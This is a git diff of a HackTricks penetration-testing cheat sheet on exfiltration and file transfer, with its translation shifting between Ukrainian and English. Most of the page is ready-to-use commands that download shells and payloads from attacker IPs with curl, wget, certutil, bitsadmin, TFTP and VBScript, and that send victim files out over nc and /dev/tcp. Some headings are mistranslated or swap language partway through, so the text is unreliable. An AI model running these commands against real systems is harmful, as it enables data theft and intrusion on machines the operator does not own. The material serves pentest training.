@@ -1,40 +1,32 @@
-# Ексфільтрація
+# Exfiltration
 
 {% hint style="success" %}
-Вивчайте та практикуйте взлом AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Школа взлому HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Вивчайте та практикуйте взлом GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Школа взлому HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Підтримайте HackTricks</summary>
+<summary>Support HackTricks</summary>
 
-* Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на GitHub.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
 {% endhint %}
 
-**Група Try Hard Security**
+## Загальновідомі домени для ексфільтрації інформації
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+Check [https://lots-project.com/](https://lots-project.com/) to find commonly whitelisted domains that can be abused
 
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
-## Часто дозволені домени для ексфільтрації інформації
-
-Перевірте [https://lots-project.com/](https://lots-project.com/), щоб знайти часто дозволені домени, які можна зловживати
-
-## Копіювання та вставлення Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
 base64 -w0 <file> #Encode file
 base64 -d file #Decode file
 ```
-**Windows**
+**Вікна**
 ```
 certutil -encode payload.dll payload.b64
 certutil -decode payload.b64 payload.dll
@@ -48,7 +40,7 @@ wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
 curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
 fetch 10.10.14.14:8000/shell.py #FreeBSD
 ```
-**Windows**
+**Вікна**
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
 bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf
@@ -67,7 +59,7 @@ Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
 * [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
-* Модуль Python [uploadserver](https://pypi.org/project/uploadserver/):
+* Python модуль [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
 python3 -m pip install --user uploadserver
@@ -123,7 +115,7 @@ app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
 ```
 ## FTP
 
-### FTP сервер (Python)
+### FTP сервер (python)
 ```bash
 pip3 install pyftpdlib
 python3 -m pyftpdlib -p 21
@@ -151,7 +143,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Клієнт Windows**
+### **Windows** клієнт
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -171,7 +163,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Або створіть smb-ресурс **за допомогою samba**:
+Або створіть smb share **використовуючи samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -186,29 +178,7 @@ guest ok = Yes
 #Start samba
 service smbd restart
 ```
-Windows
-
----
-
-### Exfiltration
-
-Exfiltration is the unauthorized transfer of data from a target. There are various methods to exfiltrate data from a compromised system, including:
-
-- **Compression**: Compressing data before exfiltration can help evade detection.
-- **Encryption**: Encrypting data can prevent unauthorized access if the exfiltrated data is intercepted.
-- **Steganography**: Hiding data within other files or messages can help avoid detection.
-- **Protocol Tunneling**: Using protocols such as DNS or HTTP to tunnel data out of a network can bypass security controls.
-- **Data Exfiltration Tools**: Utilizing specialized tools designed for data exfiltration can simplify the process.
-
-Exfiltration can occur over various channels, including:
-
-- **Email**: Sending data as email attachments.
-- **DNS**: Using DNS queries to exfiltrate data.
-- **HTTP/HTTPS**: Sending data over HTTP or HTTPS connections.
-- **FTP**: Transferring data using FTP protocols.
-- **Cloud Storage**: Uploading data to cloud storage services.
-
-It is essential for security professionals to understand exfiltration techniques to better protect against data breaches.
+Віндовс
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -218,40 +188,38 @@ WindPS-2> cd new_disk:
 ```
 ## SCP
 
-Атакуючому потрібно мати запущений SSHd.
+Атакуючий повинен мати запущений SSHd.
 ```bash
 scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Якщо жертва має SSH, зловмисник може змонтувати каталог з жертви на зловмисника.
+Якщо жертва має SSH, зловмисник може змонтувати каталог з жертви до зловмисника.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
 sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
 ```
 ## NC
-
-NC (Netcat) - універсальний інструмент для зчитування та записування даних через мережу. Він може бути використаний для встановлення зв'язку з віддаленими системами, створення зворотного з'єднання та тунелювання мережевого трафіку. Netcat може бути корисним для ексфільтрації даних під час тестування на проникнення.
 ```bash
 nc -lvnp 4444 > new_file
 nc -vn <IP> 4444 < exfil_file
 ```
 ## /dev/tcp
 
-### Завантаження файлу з жертви
+### Завантажити файл з жертви
 ```bash
 nc -lvnp 80 > file #Inside attacker
 cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
 ```
-### Завантаження файлу на жертву
+### Завантажити файл на жертву
 ```bash
 nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 # Inside victim
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Спасибі **@BinaryShadow\_**
+дякую **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -273,15 +241,15 @@ sniff(iface="tun0", prn=process_packet)
 ```
 ## **SMTP**
 
-Якщо ви можете надсилати дані на SMTP-сервер, ви можете створити SMTP для отримання даних за допомогою Python:
+Якщо ви можете надіслати дані на SMTP сервер, ви можете створити SMTP для отримання даних за допомогою python:
 ```bash
 sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-За замовчуванням у XP та 2003 (в інших потрібно явно додати під час встановлення)
+За замовчуванням у XP та 2003 (в інших його потрібно явно додати під час встановлення)
 
-У Kali **запустіть TFTP-сервер**:
+У Kali, **запустіть TFTP сервер**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -293,18 +261,16 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-У **жертви** підключіться до сервера Kali:
+В **жертві**, підключіться до сервера Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Завантажте файл за допомогою однорядкового PHP:
+Завантажте файл за допомогою PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
-## VBScript
-
 ## VBScript
 ```bash
 Attacker> python -m SimpleHTTPServer 80
@@ -343,13 +309,13 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Програма `debug.exe` не тільки дозволяє переглядати бінарні файли, але також має **можливість перебудовувати їх з шістнадцяткового коду**. Це означає, що, надавши шістнадцятковий код бінарного файлу, `debug.exe` може згенерувати бінарний файл. Однак важливо зауважити, що у `debug.exe` є **обмеження на збирання файлів розміром до 64 кб**.
+Програма `debug.exe` не тільки дозволяє перевіряти бінарні файли, але також має **можливість відновлювати їх з шістнадцяткового коду**. Це означає, що, надаючи шістнадцятковий код бінарного файлу, `debug.exe` може згенерувати бінарний файл. Однак важливо зазначити, що debug.exe має **обмеження на складання файлів до 64 кб**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Потім скопіюйте текст у вікно-оболонку та буде створено файл з назвою nc.exe.
+Тоді скопіюйте та вставте текст у windows-shell, і буде створено файл під назвою nc.exe.
 
 * [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
@@ -357,23 +323,17 @@ wine exe2bat.exe nc.exe nc.txt
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
 {% hint style="success" %}
-Навчайтесь та вправляйтесь у взломі AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**Навчання HackTricks AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Навчайтесь та вправляйтесь у взломі GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**Навчання HackTricks GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Вивчайте та практикуйте AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Вивчайте та практикуйте GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Підтримайте HackTricks</summary>
 
 * Перевірте [**плани підписки**](https://github.com/sponsors/carlospolop)!
-* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи Telegram**](https://t.me/peass) або **слідкуйте** за нами на **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Поширюйте хакерські трюки, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв GitHub.
+* **Приєднуйтесь до** 💬 [**групи Discord**](https://discord.gg/hRep4RUj7f) або [**групи telegram**](https://t.me/peass) або **слідкуйте** за нами в **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Діліться хакерськими трюками, надсилаючи PR до** [**HackTricks**](https://github.com/carlospolop/hacktricks) та [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) репозиторіїв на github.
 
 </details>
 {% endhint %}
